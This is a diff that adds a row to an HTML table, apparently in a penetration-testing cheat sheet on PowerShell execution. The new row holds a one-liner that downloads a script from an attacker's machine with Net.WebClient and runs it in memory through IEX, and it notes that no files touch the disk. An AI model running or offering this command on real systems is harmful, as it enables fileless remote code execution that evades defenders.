@@ -72,6 +72,15 @@
         can compile and text content to a script block. Then, using (<code>&amp;</code>)
         we can easily execute this compiled and formatted text file.</td>
     </tr>
+    <tr>
+      <td style="text-align:left">
+        <p><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://&lt;ip:port/filename.ps1&gt;) | PowerShell -NoProfile -</code>
+        </p>
+        <p></p>
+      </td>
+      <td style="text-align:left">Download script from attacker&apos;s machine, then run in PowerShell,
+        in memory. No files are written to disk.</td>
+    </tr>
   </tbody>
 </table>
 
